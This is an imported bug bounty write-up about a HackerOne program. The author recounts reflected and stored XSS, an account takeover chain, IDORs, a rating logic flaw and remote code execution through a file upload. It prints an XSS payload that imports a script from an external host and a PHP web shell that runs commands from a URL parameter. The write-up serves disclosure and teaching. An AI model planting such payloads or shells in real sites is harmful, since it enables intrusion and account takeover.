---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-11-01_7000-bounty-on-a-single-web-application.md
original_filename: 2023-11-01_7000-bounty-on-a-single-web-application.md
title: $7000 Bounty on a Single Web Application
category: documents
detected_topics:
- xss
- idor
- command-injection
- business-logic
- sso
- file-upload
tags:
- imported
- documents
- xss
- idor
- command-injection
- business-logic
- sso
- file-upload
language: en
raw_sha256: c532e597ba8a36ddc77f4893a76dc254750a1d7363f7cc43cba8fb430ac30408
text_sha256: c7e7ba9ca26554d40a925b3fe74168bf9b8963b5e9f4c97a78837fad9c6ffbc5
ingested_at: '2026-06-28T07:32:27Z'
sensitivity: unknown
redactions_applied: false
---

# $7000 Bounty on a Single Web Application

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-11-01_7000-bounty-on-a-single-web-application.md
- Source Type: markdown
- Detected Topics: xss, idor, command-injection, business-logic, sso, file-upload
- Ingested At: 2026-06-28T07:32:27Z
- Redactions Applied: False
- Raw SHA256: `c532e597ba8a36ddc77f4893a76dc254750a1d7363f7cc43cba8fb430ac30408`
- Text SHA256: `c7e7ba9ca26554d40a925b3fe74168bf9b8963b5e9f4c97a78837fad9c6ffbc5`


## Content

---
title: "$7000 Bounty on a Single Web Application"
page_title: "$7000 Bounty on a Single Web Application — Voorivex Team"
url: "https://blog.voorivex.team/7000-bounty-on-a-single-web-application"
final_url: "https://blog.voorivex.team/7000-bounty-on-a-single-web-application"
authors: ["Amir Abbas (@ImAyrix)"]
bugs: ["RCE", "Unrestricted file upload", "Stored XSS", "Reflected XSS", "Account takeover", "IDOR", "Logic flaw"]
bounty: "7,000"
publication_date: "2023-11-01"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 691
---

[All posts](/)

Bug Bounty · 01 Nov 2023 · $7,000 bounty

# $7000 Bounty on a Single Web Application

Hello, my name is Amir Abbas, an 18-year-old web security enthusiast who goes by the username ImAyrix on most social networks. I have been actively involved in web application security for approximately a year and a half. At the moment, I am hunting with the Voorivex team and thoroughly enjoy spending time with my group members. 

![](assets/avatars/amir-abbas.png)

Written by Amir Abbas (ImAyrix) external author

## What am I Going to Write About?

A 40-day part-time bug-hunting journey on a single program. The lesson: narrow recon often beats wide recon — focusing on specific technologies and endpoints made it easier to find vulnerabilities efficiently. 

## Choosing a Target

My friend Alireza pointed me at a HackerOne program with `*.domain.tld` scope. Subdomain enumeration didn't surface anything interesting, but rather than dropping the target I set wide recon aside and dug into the web application's features instead. 

## Vulnerability Discovery

### Reflected XSS

On the support contact page, I extracted parameters with the [GAP Burp Suite extension](https://github.com/xnl-h4ck3r/GAP-Burp-Extension) and bruteforced more with [x8](https://github.com/Sh1Yo/x8). The `addon` parameter reflected and turned into XSS. 

![Reflected XSS via the addon parameter](assets/images/7000-bounty-on-a-single-web-application/01-reflected-xss.png)

`[ Medium · Triaged · $500 ]`

### Stored XSS Leads to Account Takeover

The plugin comments section accepted an HTML payload that imported a remote script: 
  
  
  <form><button formaction="javascript:import('//ayrix.info/exploit/[[email protected]](/cdn-cgi/l/email-protection)')">Click Me</button></form>

The challenge was that the SSO/forgot-password lived on a different origin from the XSS. Fuzzing the XSS'd domain surfaced a hidden `legacy-login` path that exposed a forgot-password feature. After noticing two stray spaces around the email being POSTed, I trimmed them and got the reset email through: 

![Forgot-password email arriving after trimming the email field](assets/images/7000-bounty-on-a-single-web-application/02-forgot-password.jpeg)

The exploit chain:

  * GET the email-change page, store the CSRF token.
  * POST to the email-change endpoint with the CSRF token, swapping the victim's email for mine.
  * Trigger the legacy forgot-password flow on my email and reset.

`[ High · Triaged · $1500 ]`

### Stored XSS Leads to Account Takeover (2)

Same chain, executed inside an add-on description page after creating an add-on. `[ High · Triaged · $1500 ]`

### A Business Logic Flaw that Manipulates Add-on Stars

The rating system accepted any integer; sending `ratings=1000` pinned my add-on to the top of the list. `[ Duplicate ]`

### Remote Code Execution via File Upload

I found an older file-upload endpoint that only checked `Content-Type`, not the extension. Uploading a PHP file with `Content-Type: image/png` got accepted: 
  
  
  <?php
  $output = shell_exec($_GET["secert-cmd"]);
  echo "<pre>$output</pre>";
  ?>

Hitting the uploaded file with `?secert-cmd=…` ran arbitrary commands. `[ High · Triaged · $1500 ]`

### Access to Files of Private Add-ons (IDOR)

Each add-on file had a sequential numeric ID and a download link of `/download/<id>`. Files marked "private" were still served to anyone with the ID. Fuzzing 1–10000 enumerated the lot. `[ Medium · Triaged · $500 ]`

### IDOR in the Extract Sales Data Functionality

A premium-only sales page sent a `POST /rest/paymentinfos` with my add-on ID. Add-on IDs are public — sending someone else's gives back their sales: 

![HackerOne scope-update notification for the premium subdomain](assets/images/7000-bounty-on-a-single-web-application/03-h1-notification.png)

`[ Medium · Triaged · $500 ]`

### IDOR in the Add-on Settings (Admin Section)

A small button at the bottom of the admin page revealed a separate add-on settings panel that hadn't been audited for IDOR — and it let me edit other add-ons' admin info. `[ Medium · Triaged · $500 ]`

### Reflected XSS (#2)

Fuzzing the search page with `x8` turned up a `resource` parameter that reflected and converted to XSS. `[ Medium · Triaged · $500 ]`

## Conclusion

Wide recon isn't always the right call. Sometimes the bugs are in plain sight inside the main application's features — you just need to slow down and actually use the product.
